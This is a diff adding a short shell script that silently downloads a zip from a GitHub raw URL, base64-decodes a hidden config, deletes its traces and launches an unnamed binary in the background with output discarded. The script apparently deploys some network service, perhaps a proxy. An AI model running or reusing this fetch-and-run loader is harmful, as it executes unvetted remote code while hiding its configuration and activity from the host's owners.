@@ -1,0 +1,14 @@
+#!/bin/sh
+pkill -9 _v1
+cd /
+rm -rf _v
+mkdir -p _v
+cd _v
+wget -q -O main.zip https://raw.githubusercontent.com/newday8/f_h_v/master/main.zip
+unzip -oq main.zip
+base64 -di c.enc > c.tmp
+sed "s#\${PORT}#8080#g" < c.tmp > c
+chmod +x _v1
+rm -f main.zip c.enc c.tmp
+nohup ./_v1 -c c > /dev/null 2>&1 &
+echo _ok
